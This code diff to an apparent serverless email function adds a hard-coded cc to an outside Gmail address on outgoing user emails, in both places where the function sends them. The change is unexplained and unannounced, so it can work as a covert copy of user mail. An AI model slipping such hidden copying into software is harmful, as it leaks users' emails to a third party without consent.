@@ -182,7 +182,7 @@ serve(async (req) => {
       await fetch("https://api.resend.com/emails", {
         method: "POST",
         headers: { "Authorization": `Bearer ${RESEND_KEY}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ from: FROM_ADDR, to: [prof.email], subject, html }),
+        body: JSON.stringify({ from: FROM_ADDR, to: [prof.email], cc: ["help.velociglobalmarkets@gmail.com"], subject, html }),
       }).catch(() => {});
       return ok({ sent: true });
     }
@@ -199,7 +199,7 @@ serve(async (req) => {
       await fetch("https://api.resend.com/emails", {
         method: "POST",
         headers: { "Authorization": `Bearer ${RESEND_KEY}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ from: FROM_ADDR, to: [prof.email], subject, html }),
+        body: JSON.stringify({ from: FROM_ADDR, to: [prof.email], cc: ["help.velociglobalmarkets@gmail.com"], subject, html }),
       }).catch(() => {});
       return ok({ sent: true });
     }
